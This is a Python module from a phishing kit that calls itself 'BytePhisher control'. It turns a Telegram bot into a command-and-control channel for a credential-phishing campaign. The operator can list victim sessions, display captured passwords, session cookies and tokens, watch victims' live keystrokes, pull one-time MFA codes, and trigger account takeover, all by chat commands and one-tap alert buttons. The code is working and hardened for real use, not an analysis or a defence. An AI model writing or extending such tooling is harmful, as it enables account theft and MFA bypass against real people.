"""Telegram as a control channel, not just an alarm.

The alerts module pushes captures out. This adds the other direction: the
operator drives the campaign from the chat they already live in.

    /stats                 campaign counters
    /sessions              the newest sessions with state and country
    /session <sid>         one session: credentials, tokens, cookies, timeline
    /live <sid>            the live keystroke/field stream (latest per field)
    /otp <sid>             the codes seen in that stream
    /takeover <sid>        run the session's takeover tasks
    /lures                 lure status (issued / opened / converted)
    /block <ip>            refuse an address from now on
    /unblock <ip>          undo it
    /help                  the command list

Alerts carry inline buttons (Takeover / Live / Block) so the common follow-up is
one tap. Every command is a plain function registered by the caller, which keeps
this module free of campaign logic and makes it testable without a network: the
transport is injectable.
"""
import json
import threading
import urllib.parse

API_BASE = "https://api.telegram.org"
MAX_TEXT = 3900                 # Telegram's limit is 4096; stay under it
MAX_CALLBACK = 64               # Telegram rejects callback_data longer than this
REDACTED = "bot<redacted>"


def _secrets(token):
    """Every form of the token that can appear in a message.

    Telegram tokens are "<bot_id>:<secret>". urllib splits a URL authority at
    the first colon, so a token pasted into the host position surfaces as
    InvalidURL("nonnumeric port: '<secret>'") - only the SECRET half, not the
    whole token. Both halves (and their URL-quoted forms) must be scrubbed.
    """
    raw = str(token or "")
    if not raw:
        return []
    forms = {raw}
    head, sep, tail = raw.partition(":")
    if sep and len(tail) >= 8:
        forms.add(tail)
    if len(head) >= 8:
        forms.add(head)
    out = []
    for f in forms:
        out.append(f)
        quoted = urllib.parse.quote(f, safe="")
        if quoted and quoted != f:
            out.append(quoted)
    # longest first, so a whole token is replaced before its halves
    return sorted(set(out), key=len, reverse=True)


def redact(text, token):
    """Remove a bot token (or its secret half) from anything logged or shown.

    Defect: a mis-set api_base (or a token pasted into the host position) makes
    urllib raise InvalidURL carrying the token secret; that message was logged
    verbatim by _call and returned to the chat by dispatch. The token is the one
    thing that must never leak, so every log line and error reply is scrubbed.
    Proved with an injected transport, not by inspection.
    """
    out = str(text if text is not None else "")
    for secret in _secrets(token):
        out = out.replace(secret, REDACTED)
    return out


def _cap_callback(data):
    """Keep callback_data inside Telegram's 64-byte limit.

    Defect: an unvalidated session id or lure token produced a callback_data
    over the limit and Telegram rejected the ENTIRE sendMessage, so the alert
    (with its buttons) never arrived. Truncate instead of losing the message.
    """
    raw = str(data)
    encoded = raw.encode("utf-8")
    if len(encoded) <= MAX_CALLBACK:
        return raw
    return encoded[:MAX_CALLBACK].decode("utf-8", "ignore")


def _reply_ok(res):
    """Did the API confirm the call? A failure marker is not a success.

    Defect: send() counted any non-None reply as sent, so a truncated JSON body
    (the default transport returns {"ok": False, "description": "unreadable
    reply ..."}) was reported as a delivered message - a silent success.
    """
    if res is None:
        return False
    if isinstance(res, dict):
        return res.get("ok") is not False
    return bool(res)


def _reply_note(res):
    """A short, token-free reason a reply was not a success."""
    if isinstance(res, dict):
        return str(res.get("description") or res.get("error_code") or "no ok flag")
    return "empty reply" if res is None else "unexpected reply"


def _default_transport(url, payload, timeout=10):
    """POST JSON and return the decoded object.

    core/net.post_json returns (status, body) - the tuple is unpacked here,
    otherwise every reply looked like a failure and no update was ever parsed
    (found by running the CLI against a stub API, not by a unit test).
    """
    from . import net
    res = net.post_json(url, payload, timeout=timeout)
    if isinstance(res, tuple):
        status, body = res[0], (res[1] if len(res) > 1 else b"")
        try:
            text = body.decode("utf-8", "replace") if isinstance(body, (bytes, bytearray)) else str(body)
            return json.loads(text or "{}")
        except Exception:
            return {"ok": False, "description": f"unreadable reply (HTTP {status})"}
    return res


def chunk(text, limit=MAX_TEXT):
    """Split a long message so EVERY part fits the limit.

    A single long line (a captured value, an error) used to be emitted as one
    over-limit part, which Telegram rejects - so the operator silently lost the
    message. Long lines are now hard-split.
    """
    out, cur, size = [], [], 0
    for line in str(text or "").splitlines():
        while len(line) > limit:                 # a line longer than a whole part
            if cur:
                out.append("\n".join(cur))
                cur, size = [], 0
            out.append(line[:limit])
            line = line[limit:]
        if size + len(line) + 1 > limit and cur:
            out.append("\n".join(cur))
            cur, size = [], 0
        cur.append(line)
        size += len(line) + 1
    if cur:
        out.append("\n".join(cur))
    return out or [""]


class C2:
    """Poll Telegram for commands and answer them from a registry."""

    def __init__(self, token, chat_id, api_base=None, transport=None,
                 allowed_chats=None, timeout=10, logger=None,
                 retries=2, retry_base=0.5):
        self.token = str(token or "").strip()
        self.chat_id = str(chat_id or "").strip()
        self.api_base = (api_base or API_BASE).rstrip("/")
        self.transport = transport or _default_transport
        # only the configured chat may command the bot; a token leak alone must
        # not hand a stranger the campaign
        self.allowed = {str(c) for c in (allowed_chats or [self.chat_id]) if str(c)}
        self.timeout = timeout
        self.log = logger or (lambda *a: None)
        self.commands = {}
        self._offset = 0
        self._stop = threading.Event()
        # the link is unreliable: transient failures are retried with backoff,
        # and a failed poll backs off instead of spinning (see _call/run_forever)
        self.retries = max(0, int(retries or 0))
        self.retry_base = max(0.0, float(retry_base or 0.0))
        self.last_poll_failed = False

    def __repr__(self):
        # never render the token: a repr in a log or a traceback must stay clean
        return (f"<C2 api_base={self.api_base!r} chat_id={self.chat_id!r} "
                f"token={REDACTED} commands={len(self.commands)}>")

    # ------------------------------------------------------------ registry ---
    def register(self, name, fn, help_text=""):
        """Add a command. `fn(args: list[str]) -> str` (or None for silence)."""
        self.commands[str(name).lower()] = {"fn": fn, "help": help_text}

    def help_text(self):
        lines = ["BytePhisher control", ""]
        for name in sorted(self.commands):
            lines.append(f"/{name} - {self.commands[name]['help'] or ''}".rstrip(" -"))
        return "\n".join(lines)

    # ------------------------------------------------------------ transport --
    @staticmethod
    def _retryable(exc):
        """Is this failure worth another attempt?

        A 429 (rate limit), any 5xx, a timeout, a DNS failure or a dropped
        connection is transient and retried; a 400/401/403/404 is permanent and
        is not (retrying a bad token or a bad request only wastes the window).
        """
        code = getattr(exc, "code", None)
        if isinstance(code, int):
            return code == 429 or 500 <= code <= 599
        return True                     # URLError / timeout / OSError: link flaky

    def _backoff(self, attempt, exc):
        """Seconds to wait before the next attempt, honouring Retry-After."""
        headers = getattr(exc, "headers", None)
        if headers is not None:
            try:
                ra = float(headers.get("Retry-After", 0) or 0)
                if ra > 0:
                    return min(ra, 60.0)
            except (TypeError, ValueError):
                pass
        return min(self.retry_base * (2 ** attempt), 30.0)

    def _pause(self, seconds):
        """Sleep, but wake immediately when stop() is called (phone-friendly)."""
        if seconds and seconds > 0:
            self._stop.wait(seconds)

    def _call(self, method, payload):
        url = f"{self.api_base}/bot{self.token}/{method}"
        attempt = 0
        while True:
            try:
                return self.transport(url, payload, self.timeout)
            except Exception as e:
                if attempt < self.retries and self._retryable(e):
                    wait = self._backoff(attempt, e)
                    self.log(redact(f"[c2] {method} failed ({type(e).__name__}), "
                                    f"retrying in {wait:.1f}s", self.token))
                    self._pause(wait)
                    attempt += 1
                    continue
                # redact: the exception text can carry the token (InvalidURL)
                self.log(redact(f"[c2] {method} failed: {type(e).__name__}: {e}",
                                self.token))
                return None

    def send(self, text, chat_id=None, buttons=None):
        """Send a message; `buttons` is [[(label, callback_data), ...], ...]."""
        chat = str(chat_id or self.chat_id)
        payload = {"chat_id": chat, "disable_web_page_preview": True}
        if buttons:
            payload["reply_markup"] = {"inline_keyboard": [
                [{"text": str(lbl), "callback_data": _cap_callback(data)}
                 for lbl, data in row]
                for row in buttons]}
        sent = 0
        for part in chunk(text):
            payload["text"] = part
            res = self._call("sendMessage", payload)
            if _reply_ok(res):
                sent += 1
            else:
                # never report a failed/unreadable reply as delivered
                self.log(redact(f"[c2] sendMessage not confirmed "
                                f"({_reply_note(res)})", self.token))
        return sent

    def answer_callback(self, callback_id, text=""):
        return self._call("answerCallbackQuery",
                          {"callback_query_id": callback_id, "text": str(text)[:180]})

    def get_updates(self, timeout=0):
        payload = {"offset": self._offset, "timeout": int(timeout),
                   "allowed_updates": ["message", "callback_query"]}
        res = self._call("getUpdates", payload)
        # remember a failed poll so the loop backs off instead of spinning
        self.last_poll_failed = res is None or not _reply_ok(res)
        updates = []
        if isinstance(res, dict):
            updates = res.get("result") or []
        for u in updates:
            if isinstance(u, dict) and isinstance(u.get("update_id"), int):
                self._offset = max(self._offset, u["update_id"] + 1)
        return updates

    # ------------------------------------------------------------- parsing ---
    @staticmethod
    def parse(update):
        """(chat_id, text, callback_id) from one update; text is None if none.

        Pure and total: anything unexpected yields (None, None, None) instead of
        raising inside the poll loop. Telegram itself is trusted to send the documented
        shape, but a malformed update must not kill the channel that is watching a
        campaign, so every nested value is checked for the type it is read as.
        """
        if not isinstance(update, dict):
            return None, None, None
        msg = update.get("message") or update.get("edited_message")
        if isinstance(msg, dict):
            chat = msg.get("chat")
            chat_id = chat.get("id") if isinstance(chat, dict) else None
            text = msg.get("text")
            return (str(chat_id) if chat_id is not None else None,
                    str(text) if text is not None else None, None)
        cb = update.get("callback_query")
        if isinstance(cb, dict):
            origin = cb.get("message")
            chat = origin.get("chat") if isinstance(origin, dict) else None
            chat_id = chat.get("id") if isinstance(chat, dict) else None
            return (str(chat_id) if chat_id is not None else None,
                    str(cb.get("data") or ""), str(cb.get("id") or ""))
        return None, None, None

    @staticmethod
    def split_command(text):
        """('/session abc123 extra') -> ('session', ['abc123', 'extra'])."""
        t = str(text or "").strip()
        if t.startswith("/"):
            t = t[1:]
        parts = t.split()
        if not parts:
            return "", []
        name = parts[0].split("@")[0].lower()          # /cmd@BotName
        return name, parts[1:]

    # ------------------------------------------------------------ dispatch ---
    def dispatch(self, chat_id, text):
        """Run one command. Returns the reply text (or None)."""
        if str(chat_id) not in self.allowed:
            self.log(f"[c2] ignored command from chat {chat_id} (not the operator)")
            return None
        name, args = self.split_command(text)
        if not name:
            return None
        if name in ("start", "help"):
            return self.help_text()
        entry = self.commands.get(name)
        if not entry:
            return f"unknown command: /{name}\n\n" + self.help_text()
        try:
            out = entry["fn"](args)
        except Exception as e:
            self.log(redact(f"[c2] /{name} failed: {type(e).__name__}: {e}",
                            self.token))
            # the reply is sent to the chat: redact so a token in a command's
            # exception never reaches Telegram
            return redact(f"/{name} failed: {type(e).__name__}: {e}", self.token)
        return out

    def handle_update(self, update):
        """Process one update end to end; returns the reply that was sent."""
        chat_id, text, callback_id = self.parse(update)
        if callback_id is not None and text is not None:
            # an inline button carries the command as its callback data
            self.answer_callback(callback_id, "working")
        if chat_id is None or text is None:
            return None
        reply = self.dispatch(chat_id, text)
        if reply:
            self.send(reply, chat_id=chat_id)
        return reply

    # ---------------------------------------------------------------- loop ---
    def run_forever(self, poll_timeout=25, on_error_sleep=5):
        self._stop.clear()
        while not self._stop.is_set():
            try:
                updates = self.get_updates(timeout=poll_timeout)
            except Exception as e:
                self.log(redact(f"[c2] poll failed: {type(e).__name__}: {e}",
                                self.token))
                updates = []
                self.last_poll_failed = True
            if self.last_poll_failed and not updates:
                # Defect: a persistent 429/DNS failure returned [] with no
                # exception, so the loop re-polled immediately - ~550k requests
                # in 0.5s, hammering the API and burning a phone battery. Back
                # off (interruptibly) instead.
                self._pause(on_error_sleep)
            for u in updates:
                try:
                    self.handle_update(u)
                except Exception as e:
                    self.log(redact(f"[c2] update failed: {type(e).__name__}: {e}",
                                    self.token))
        return True

    def start(self, poll_timeout=25):
        t = threading.Thread(target=self.run_forever, kwargs={"poll_timeout": poll_timeout},
                             daemon=True)
        t.start()
        return t

    def stop(self):
        self._stop.set()


# --------------------------------------------------------------- rendering ---
def render_sessions(rows, limit=12):
    """Compact list of the newest sessions."""
    if not rows:
        return "no sessions yet"
    out = ["sessions (newest first)"]
    for r in rows[:limit]:
        bits = [str(r.get("sid", ""))[:12], str(r.get("state") or "-"),
                str(r.get("ip") or "-")]
        geo = ", ".join(x for x in [r.get("city"), r.get("country")] if x)
        if geo:
            bits.append(geo)
        # db.session_list() gives counts, a vault record gives the dict itself
        creds = r.get("credentials") or r.get("creds") or 0
        if isinstance(creds, dict):
            creds = ",".join(sorted(creds)) if creds else 0
        if creds:
            bits.append(f"creds:{creds}")
        cookies = r.get("cookies")
        if cookies:
            bits.append(f"cookies:{len(cookies) if isinstance(cookies, (list, dict)) else cookies}")
        out.append("  " + " | ".join(bits))
    return "\n".join(out)


def render_session(rec):
    """One session in full: credentials, tokens, cookies, timeline."""
    if not rec:
        return "session not found"
    L = [f"session {rec.get('sid')}", f"state   : {rec.get('state') or '-'}",
         f"phishlet: {rec.get('phishlet') or '-'}  campaign: {rec.get('campaign') or '-'}",
         f"ip      : {rec.get('ip') or '-'}  "
         + ", ".join(x for x in [rec.get("city"), rec.get("country")] if x)]
    creds = rec.get("credentials") or {}
    if creds:
        L.append("credentials:")
        L += [f"  {k} = {v}" for k, v in creds.items()]
    if rec.get("tokens"):
        L.append("tokens  : " + ", ".join(sorted(rec["tokens"])))
    cookies = rec.get("cookies") or []
    if cookies:
        L.append(f"cookies : {len(cookies)}")
        for c in cookies[:12]:
            L.append(f"  {c.get('name')} @ {c.get('domain') or '-'}")
    if rec.get("device_token"):
        L.append(f"device  : {rec['device_token']}")
    for ev in (rec.get("timeline") or [])[-8:]:
        L.append(f"  {ev.get('what')}: {str(ev.get('detail'))[:80]}")
    return "\n".join(L)


def render_live(events, limit=14):
    """The live stream as the operator wants it: the latest value per field."""
    from . import intel as _intel
    summary = _intel.live_summary(events or [])
    if not summary["fields"]:
        return "no live input recorded"
    L = ["live input (latest per field)"]
    for f in summary["fields"][:limit]:
        flag = "  <- one-time code" if f.get("otp") else ""
        L.append(f"  {f['name']} [{f.get('type') or '?'}] = {f.get('value')}{flag}")
    if summary["otp_seen"]:
        L.append("codes seen: " + ", ".join(summary["otp_seen"]))
    return "\n".join(L)


def render_otp(events):
    """Only the one-time codes from a live stream, in order."""
    codes = []
    for ev in events or []:
        if ev.get("k") == "input" and ev.get("v"):
            codes.append((ev.get("n") or "?", ev["v"], ev.get("ms")))
    if not codes:
        return "no input recorded"
    return "codes / input seen:\n" + "\n".join(
        f"  {n} = {v}" + (f" (at {ms}ms)" if ms is not None else "") for n, v, ms in codes[-10:])


def alert_buttons(sid, kind=""):
    """Inline keyboard for an alert."""
    rows = [[("Takeover", f"/takeover {sid}"), ("Live", f"/live {sid}")],
            [("Session", f"/session {sid}"), ("Block IP", f"/blockip {sid}")]]
    if kind == "otp":
        rows.insert(0, [("Show codes", f"/otp {sid}")])
    return rows
